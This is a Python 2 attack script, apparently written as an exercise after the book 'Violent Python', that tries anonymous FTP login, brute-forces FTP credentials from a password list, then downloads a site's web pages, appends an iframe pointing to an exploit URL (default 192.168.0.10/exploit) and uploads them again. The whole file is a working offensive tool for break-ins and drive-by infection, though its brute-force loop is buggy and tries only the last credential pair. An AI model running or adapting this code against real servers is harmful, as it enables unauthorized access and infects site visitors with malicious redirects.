#!/usr/bin/env python2
# written by Moses Arocha
# Program attempts to brute force into an FTP server, gain access, or login in as an anonymous user, 
# then will inject malicious code into the default webpage after it has downloaded
#Created in Python, with the help of TJ O'Connor's book "Violent Python"

# IMPORTANT: The password list must be formatted liked this " username:password "
import ftplib
import optparse
import time

# Function which attempts to anonymously login to the FTP server using a fake email address so no real information is inserted
def Anonymous(hostname):
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login('anonymous', 'me@yourdomain.com')		# The username and password used to login anonymously
		print '\n\t[Success] ' + str(hostname) + ' FTP Anonymous Login Succeeded'	# Displays if anonymous login successful
		ftp.quit()							
		return True						# True: Boolean statement that is either true or false, true if login successful, failure if login has failed
	except Exception, e:
		print '\n\t[Failure] ' + str(hostname) + ' FTP Anonymous Login Failed\n'
		return False						# False: Boolean statement that indicates login failure
			
# If anonymous function login function fails, it attempts to brute force into the program using a password list.
def BruteForce(hostname, passwdFile):
	OpenFile = open(passwdFile, 'r')					# Will open the password file defined by the user
	for line in OpenFile.readlines():					# Reads each individual line, for one second will sleep
		time.sleep(1)							# Mandatory so timeout session isn't reached
		UserName = line.split(':')[0]					# If it is on the left side of the ":" it is the UserName
		Password = line.split(':')[1].strip('\r').strip('\n')		# If it is on the right side of the ":" it is the Password
		print ' [+] Trying : ' + UserName +'/' + Password
	try:
		ftp = ftplib.FTP(hostname)					# Will then attempt to login to the FTP using those credientals
		ftp.login(UserName, Password)
		print '\n [Success] ' + str(hostname) + ' FTP Login Succeeded: ' + UserName + ' : ' + Password
		ftp.quit()
		return (UserName, Password)
	except Exception, e:
		pass
	print '\n [Failure] Could Not Brute Force FTP Credentials'
	return (None, None)							# Will return nothing if password isn't found

# This function searches for the default page within the FTP server
def DefaultPage(ftp):
	try:
		dirList = ftp.nlst()						# Will attempt to find the directory contents
	except:
		dirList = []							# Catch all function, if failed, moves onto next victim
		print '\n\t[Failure] Could Not List Directory Contents'
		print '\n\t[Continue] Skipping To Next Target'
		return								# Returns nothing because nothing was found
	retList = []
	for fileName in dirList:						# In the directory contents, if .php, .htm, .asp, or .html are found, the program is successful and it has found the Default/Home Page
		fn = fileName.lower()
		if '.php' in fn or '.htm' in fn or '.asp' in fn or '.html' in fn:
			print '[+] Found Home Page: ' + fileName
		retList.append(fileName)
	return retList

# After the brute force, the function will then find the default page, it then begins the insertion process, by downloading the page, inserting an 
# Iframe into it so that redirects the victims to a malicious site, then reuploads the page to the server
def Injection(ftp, page, redirect):
	f = open(page + '.tmp', 'w')
	ftp.retrlines('RETR ' + page, f.write)
	print ' [Step 1] Downloaded Page: ' + page			# Downloading of the page
	f.write(redirect)
	f.close()
	print ' [Step 2] Injected Malicious IFrame on: '+ page		
	ftp.storlines('STOR ' + page, open(page + '.tmp'))		# Injecting the malicious IFrame, uploading page
	print ' [Step 3] Uploaded Injected Page: ' + page
	
def WebAttack(username, password, TargetHost, redirect):
	ftp = ftplib.FTP(TargetHost)
	ftp.login(username, password)
	defPages = DefaultPage(ftp)
	for defPage in defPages:
		Injection(ftp, defPage, redirect)

# The main function will grab the users input, attempt to anonymously access, if failed, it will then brute force, after grabbing the user/pass
# It will then login through those credientals, grab the default/home page, insert an iframe, reupload the code
def main():
	parser = optparse.OptionParser("Usages For Program: -H <Target Host[s]> -R <Redirect Page> -F <Password File>")
	parser.add_option('-H', '--Host', dest='TargetHosts', type='string', help='specify target host')
	parser.add_option('-P', '--Password', dest='passwdFile', type='string', help='specify user/password file', default='passwordlist.txt')
	parser.add_option('-R', '--Redirect', dest='redirect', type='string', help='specify a redirection page', default='<iframe src="http://192.168.0.10:80/exploit"></iframe>')
	(options, args) = parser.parse_args()
	TargetHosts = str(options.TargetHosts).split(',') 		# No space between inserting different hosts
	passwdFile = options.passwdFile
	redirect = options.redirect
	if TargetHosts == None or redirect == None:			# Avoided mostly through the default, however catch all just in case
		print parser.usage
		exit(0)
	for TargetHost in TargetHosts:					# We must set the username and password to none to then define
		username = None
		password = None
		if Anonymous(TargetHost) == True:			# Will only print if Boolean from Anonymous is True
			username = 'anonymous'
			password = 'me@yourdomain.com'
			print ' [Success] Now Using Anonymous Username and Password'
			WebAttack(username, password, TargetHost, redirect) # Will immediately go to web attack
		elif passwdFile != None:
			(username, password) = BruteForce(TargetHost, passwdFile)
		if password != None:	
			print '[+] Using Credientals: ' + username + '/' + password + ' To WebAttack'
			WebAttack(username, password, TargetHost, redirect)


if __name__ == '__main__':
	main()